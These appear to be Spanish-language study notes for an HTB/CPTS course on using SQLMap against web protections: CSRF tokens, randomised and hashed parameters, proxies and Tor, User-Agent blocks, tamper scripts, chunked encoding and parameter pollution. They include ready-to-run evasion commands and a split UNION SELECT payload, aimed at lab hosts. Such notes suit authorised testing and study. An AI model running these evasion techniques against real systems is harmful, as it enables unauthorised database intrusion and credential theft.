
## 1. Evasión de protecciones web

Durante una SQL Injection, podemos encontrarnos con mecanismos de seguridad que dificultan la automatización mediante SQLMap.

Entre ellos:

- Tokens anti-CSRF.
    
- Parámetros que requieren valores únicos.
    
- Parámetros calculados mediante hashes.
    
- Bloqueos por dirección IP.
    
- WAF (Web Application Firewall).
    
- Bloqueos del User-Agent de SQLMap.
    
- Filtros de palabras clave SQL.
    

SQLMap incorpora diferentes opciones para adaptar las peticiones y superar algunas de estas restricciones.

---

## 2. Tokens Anti-CSRF

Algunas aplicaciones utilizan tokens CSRF que cambian entre peticiones.

Ejemplo de petición POST:

```
POST /login.php HTTP/1.1
Host: target.htb
Content-Type: application/x-www-form-urlencoded

id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE
```

Si SQLMap reutiliza un token caducado, la aplicación puede rechazar las peticiones.

### --csrf-token

Permite indicar qué parámetro contiene el token CSRF.

```
sqlmap -u 'http://target.htb/' \
--data='id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE' \
--csrf-token='csrf-token'
```

SQLMap intentará obtener automáticamente un token actualizado de las respuestas HTTP y utilizarlo en las siguientes peticiones.

También puede detectar automáticamente parámetros que contengan nombres como:

- `csrf`
    
- `xsrf`
    
- `token`
    

En estos casos, puede preguntar si queremos actualizar el token automáticamente.

**Cuándo utilizarlo:** cuando una aplicación utiliza tokens CSRF dinámicos y SQLMap recibe errores al reutilizar el mismo token.

---

## 3. Parámetros con valores únicos

Algunas aplicaciones requieren que determinados parámetros tengan un valor diferente en cada petición.

Por ejemplo:

```
GET /?id=1&rp=29125 HTTP/1.1
Host: target.htb
```

El parámetro `rp` debe cambiar constantemente.

### --randomize

Permite generar automáticamente nuevos valores para un parámetro.

```
sqlmap -u 'http://target.htb/?id=1&rp=29125' \
--randomize=rp \
--batch
```

Ejemplo de peticiones:

```
/?id=1&rp=99954
/?id=1&rp=87216
/?id=1&rp=36456
/?id=1&rp=16689
```

SQLMap modifica el valor de `rp` antes de enviar cada petición.

### Visualizar las peticiones

```
sqlmap -u 'http://target.htb/?id=1&rp=29125' \
--randomize=rp \
--batch \
-v 5
```

**Cuándo utilizarlo:** cuando un parámetro debe contener un valor único para evitar que la aplicación rechace peticiones repetidas.

---

## 4. Parámetros calculados

Algunas aplicaciones utilizan parámetros cuyo valor depende de otro parámetro.

Por ejemplo:

```
id=1
h=MD5(id)
```

La petición podría ser:

```
GET /?id=1&h=c4ca4238a0b923820dcc509a6f75849b HTTP/1.1
Host: target.htb
```

Si SQLMap modifica `id`, también debe actualizar el hash `h`.

### --eval

Permite ejecutar código Python antes de enviar cada petición.

```
sqlmap -u 'http://target.htb/?id=1&h=c4ca4238a0b923820dcc509a6f75849b' \
--eval="import hashlib; h=hashlib.md5(id.encode()).hexdigest()" \
--batch
```

SQLMap recalculará el valor de `h` cuando cambie `id`.

Ejemplo:

```
id=1
h=c4ca4238a0b923820dcc509a6f75849b

id=9061
h=4d7e0d72898ae7ea3593eb5ebf20c744
```

**Importante:** `--eval` permite ejecutar código Python personalizado para calcular parámetros dependientes.

**Cuándo utilizarlo:** cuando una aplicación requiere hashes, firmas u otros valores derivados de los parámetros enviados.

# 5. Utilizar proxies y Tor

SQLMap permite enviar sus peticiones mediante proxies.

Esto puede resultar útil para trabajar con una infraestructura de pruebas o cuando necesitamos utilizar una ruta de red específica.

## --proxy

Permite configurar un proxy HTTP o SOCKS.

Ejemplo con un proxy SOCKS4:

```
sqlmap -u 'http://target.htb/?id=1' \
--proxy='socks4://127.0.0.1:1080'
```

El proxy debe estar funcionando y ser accesible.

### Utilizar Burp Suite como proxy

Para inspeccionar las peticiones enviadas por SQLMap:

```
sqlmap -u 'http://target.htb/?id=1' \
--proxy='http://127.0.0.1:8080'
```

Esto permite observar las peticiones desde Burp Suite, siempre que el proxy esté escuchando en ese puerto.

## --proxy-file

Permite proporcionar un archivo que contenga diferentes proxies.

```
sqlmap -u 'http://target.htb/?id=1' \
--proxy-file=proxies.txt
```

SQLMap puede utilizar los proxies de la lista y cambiar al siguiente cuando encuentre problemas.

## --tor

Permite utilizar la red Tor si está correctamente configurada.

```
sqlmap -u 'http://target.htb/?id=1' --tor
```

SQLMap intentará localizar un proxy Tor local, normalmente en los puertos:

```
9050
9150
```

### --check-tor

Comprueba si la conexión está utilizando Tor correctamente.

```
sqlmap -u 'http://target.htb/?id=1' \
--tor \
--check-tor
```

**Importante:** utilizar Tor o un proxy no garantiza anonimato completo. Además, para laboratorios HTB normalmente debemos mantener la conectividad adecuada mediante su VPN.

# 6. Detección de WAF

Un WAF (Web Application Firewall) analiza las peticiones HTTP e intenta bloquear tráfico malicioso.

SQLMap realiza pruebas iniciales para identificar posibles protecciones.

Por ejemplo, puede enviar un parámetro inexistente con un payload sospechoso:

```
GET /?pfov=<payload> HTTP/1.1
Host: target.htb
```

Si la respuesta cambia significativamente respecto a una petición normal, puede indicar la existencia de un WAF.

Ejemplo:

```
HTTP/1.1 406 Not Acceptable
```

Este comportamiento puede aparecer con determinadas configuraciones de ModSecurity.

SQLMap también utiliza firmas de herramientas como `identYwaf` para intentar identificar soluciones WAF.

### --skip-waf

Permite omitir la prueba heurística inicial de detección de WAF.

```
sqlmap -u 'http://target.htb/?id=1' \
--skip-waf
```

**Cuándo utilizarlo:** cuando queremos evitar esa prueba inicial y reducir las peticiones generadas durante la detección.

**Importante:** `--skip-waf` no desactiva ni evade el WAF; únicamente omite su comprobación inicial.

---

## 7. Bloqueo del User-Agent

Algunas aplicaciones bloquean peticiones que contienen el User-Agent predeterminado de SQLMap.

Ejemplo:

```
User-Agent: sqlmap/1.4.9
```

Esto puede provocar errores HTTP desde el comienzo del análisis.

### --random-agent

Permite utilizar un User-Agent aleatorio de navegador.

```
sqlmap -u 'http://target.htb/?id=1' \
--random-agent
```

También podemos establecer uno manualmente:

```
sqlmap -u 'http://target.htb/?id=1' \
--user-agent='Mozilla/5.0'
```

**Cuándo utilizarlo:** cuando SQLMap recibe errores HTTP o bloqueos relacionados con su User-Agent.

# 8. Tamper Scripts

Los **Tamper Scripts** son scripts de Python que modifican los payloads de SQLMap antes de enviarlos al objetivo.

Su finalidad es cambiar la representación de las consultas SQL para evitar determinados filtros o restricciones.

Por ejemplo, una aplicación puede bloquear directamente el operador:

```
=
```

Un Tamper Script puede sustituirlo por una expresión equivalente utilizando `BETWEEN`.

## --tamper

Permite cargar uno o varios scripts de manipulación.

Ejemplo:

```
sqlmap -u 'http://target.htb/?id=1' \
--tamper=between
```

También podemos combinar varios:

```
sqlmap -u 'http://target.htb/?id=1' \
--tamper=between,randomcase
```

SQLMap ejecutará los scripts según sus prioridades.

---

## 9. Tamper Scripts importantes

|Script|Función|
|---|---|
|`between`|Sustituye operadores `>` y `=` por expresiones con `BETWEEN`|
|`randomcase`|Alterna mayúsculas y minúsculas en palabras clave SQL|
|`space2comment`|Sustituye espacios por comentarios SQL|
|`space2dash`|Sustituye espacios por comentarios con `--` y saltos de línea|
|`space2hash`|Sustituye espacios por comentarios con `#`|
|`space2plus`|Sustituye espacios por `+`|
|`space2randomblank`|Sustituye espacios por caracteres en blanco alternativos|
|`base64encode`|Codifica el payload utilizando Base64|
|`equaltolike`|Sustituye `=` por `LIKE`|
|`percentage`|Añade `%` delante de los caracteres|
|`symboliclogical`|Sustituye `AND` y `OR` por `&&` y `\|`|
|`versionedkeywords`|Introduce palabras clave en comentarios versionados de MySQL|
|`versionedmorekeywords`|Introduce más palabras clave en comentarios versionados|
|`halfversionedmorekeywords`|Añade comentarios versionados antes de palabras clave|
|`modsecurityversioned`|Envuelve consultas en comentarios versionados de MySQL|
|`modsecurityzeroversioned`|Utiliza comentarios versionados de MySQL con versión cero|
|`commalesslimit`|Sustituye `LIMIT M,N` por `LIMIT N OFFSET M`|
|`plus2concat`|Sustituye `+` por `CONCAT()` en MSSQL|
|`0eunion`|Modifica las apariciones de `UNION`|

### Ejemplos prácticos

**Modificar mayúsculas y minúsculas:**

```
sqlmap -r req.txt \
--tamper=randomcase
```

Ejemplo de transformación:

```
SELECT username FROM users
```

Puede convertirse en:

```
SEleCt username FrOM users
```

**Sustituir espacios por comentarios:**

```
sqlmap -r req.txt \
--tamper=space2comment
```

Ejemplo:

```
SELECT username FROM users
```

Se transforma en:

```
SELECT/**/username/**/FROM/**/users
```

**Combinar scripts:**

```
sqlmap -r req.txt \
--tamper=space2comment,randomcase
```

### Listar los scripts disponibles

```
sqlmap --list-tampers
```

Este comando muestra los scripts disponibles y sus descripciones.

**Importante:** no todos los Tamper Scripts funcionan con todos los DBMS o filtros. Debemos seleccionar los que correspondan al comportamiento observado.

# 10. Chunked Transfer Encoding

Algunos filtros inspeccionan las peticiones HTTP buscando determinadas palabras clave.

SQLMap permite utilizar transferencia fragmentada mediante `--chunked`.

```
sqlmap -u 'http://target.htb/' \
--data='id=1' \
--chunked
```

Esta opción divide el cuerpo de una petición POST en fragmentos HTTP.

Ejemplo conceptual:

```
POST / HTTP/1.1
Host: target.htb
Transfer-Encoding: chunked
```

El cuerpo se transmite utilizando diferentes fragmentos.

Esto puede afectar al comportamiento de filtros que no procesan correctamente las peticiones fragmentadas.

**Cuándo utilizarlo:** cuando el objetivo admite `Transfer-Encoding: chunked` y queremos comprobar cómo procesan las peticiones los filtros intermedios.

# 11. HTTP Parameter Pollution (HPP)

La contaminación de parámetros HTTP consiste en enviar varias veces un parámetro con el mismo nombre.

Ejemplo:

```
GET /?id=1&id=2&id=3 HTTP/1.1
Host: target.htb
```

El comportamiento depende de cómo la aplicación procese los parámetros repetidos.

Algunas tecnologías:

- Utilizan el primer valor.
    
- Utilizan el último valor.
    
- Combinan varios valores.
    

En determinados entornos, este comportamiento puede aprovecharse para dividir un payload SQL entre varios parámetros.

Ejemplo conceptual:

```
GET /?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users HTTP/1.1
Host: target.htb
```

Si la aplicación concatena los valores, podría reconstruirse una expresión SQL.

**Importante:** esta técnica depende completamente del comportamiento del servidor y del framework utilizado.

# 13. Metodología práctica para HTB / CPTS

## Paso 1. Probar SQLMap normalmente

```
sqlmap -r req.txt -p id --batch
```

Si la aplicación responde correctamente, no necesitamos añadir mecanismos adicionales.

## Paso 2. Comprobar si existe un bloqueo por User-Agent

```
sqlmap -r req.txt -p id \
--random-agent \
--batch
```

## Paso 3. Comprobar si existen tokens CSRF

Si la petición contiene:

```
id=1&csrf_token=abc123
```

Ejecutamos:

```
sqlmap -r req.txt \
-p id \
--csrf-token=csrf_token
```

## Paso 4. Comprobar parámetros dinámicos

Si encontramos:

```
id=1&nonce=12345
```

Podemos utilizar:

```
sqlmap -r req.txt \
-p id \
--randomize=nonce
```

## Paso 5. Inspeccionar las peticiones con Burp Suite

```
sqlmap -r req.txt \
-p id \
--proxy='http://127.0.0.1:8080'
```

Esto permite observar las peticiones y respuestas para identificar qué está bloqueando la aplicación.

## Paso 6. Probar Tamper Scripts según el filtro

Si identificamos un filtro que bloquea espacios:

```
sqlmap -r req.txt \
-p id \
--tamper=space2comment
```

Si identificamos un filtro sensible a mayúsculas y minúsculas:

```
sqlmap -r req.txt \
-p id \
--tamper=randomcase
```

Podemos combinar ambos:

```
sqlmap -r req.txt \
-p id \
--tamper=space2comment,randomcase
```

## Paso 7. Ajustar las pruebas si es necesario

```
sqlmap -r req.txt \
-p id \
--random-agent \
--tamper=space2comment,randomcase \
--level=3 \
--risk=2
```

Utilizar valores elevados de `--level` y `--risk` únicamente cuando sea necesario y dentro del alcance autorizado.

# 14. Puntos importantes para el examen

1. `**--csrf-token**` permite actualizar automáticamente tokens anti-CSRF.
    
2. `**--randomize**` genera valores diferentes para parámetros que deben ser únicos.
    
3. `**--eval**` permite ejecutar código Python para recalcular parámetros dependientes.
    
4. `**--proxy**` permite enviar las peticiones de SQLMap a través de Burp Suite u otro proxy.
    
5. `**--random-agent**` modifica el User-Agent predeterminado de SQLMap.
    
6. `**--skip-waf**` omite la prueba inicial de detección de WAF.
    
7. `**--tamper**` permite modificar los payloads antes de enviarlos.
    
8. `**space2comment**` sustituye espacios por comentarios SQL.
    
9. `**randomcase**` modifica las mayúsculas y minúsculas de las palabras clave.
    
10. `**between**` transforma determinados operadores de comparación.
    
11. `**--chunked**` utiliza transferencia HTTP fragmentada.
    
12. **HPP** consiste en enviar parámetros repetidos y depende de cómo los procese la aplicación.
    

### Comandos principales

```
# Actualizar tokens CSRF
sqlmap -r req.txt --csrf-token=csrf_token

# Aleatorizar parámetros
sqlmap -r req.txt --randomize=nonce

# Utilizar Burp Suite
sqlmap -r req.txt --proxy='http://127.0.0.1:8080'

# Cambiar User-Agent
sqlmap -r req.txt --random-agent

# Listar Tamper Scripts
sqlmap --list-tampers

# Sustituir espacios por comentarios
sqlmap -r req.txt --tamper=space2comment

# Modificar mayúsculas y minúsculas
sqlmap -r req.txt --tamper=randomcase

# Combinar Tamper Scripts
sqlmap -r req.txt --tamper=space2comment,randomcase

# Utilizar transferencia fragmentada
sqlmap -r req.txt --chunked
```

**Idea principal:** cuando SQLMap no consigue explotar una SQL Injection debido a protecciones web, debemos identificar primero qué mecanismo está interfiriendo y después utilizar la opción adecuada. Los Tamper Scripts son especialmente útiles frente a filtros SQL simples, pero no garantizan superar un WAF moderno.
